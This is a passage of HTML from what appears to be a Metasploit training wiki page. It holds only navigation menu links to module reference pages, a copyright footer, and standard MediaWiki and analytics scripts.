                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                        <li>Multiple OS
                                                                <ul class="two">
                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
                                                                </ul>
							                                	<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
                                        <div class="menu four-column">
                                                <h3>Auxiliary Module Reference</h3>
                                                <ul class="one">
                                                        <li>Admin   
                                                                <ul class="two">
                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Scanner
                                                                <ul class="two">
                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>Server
                                                                <ul class="two">
                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
			<br />
			<br />
			<br />
			<br />
			</ul>
													</div>
				
					<div class="clear"></div>
				</div>

				<div id="footer">
					<div id="footer-content">
						<div class="left">
							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
						</div>
						<div class="right">
							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
						</div>
						<div class="clear"></div>
					</div>
				</div>
			
		</div>
<script>if(window.mw){
mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
}</script>
<script>if(window.mw){
mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
}</script>
<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-1981501-1");
pageTracker._trackPageview();
</script><!-- Served in 0.151 secs. --></body></html>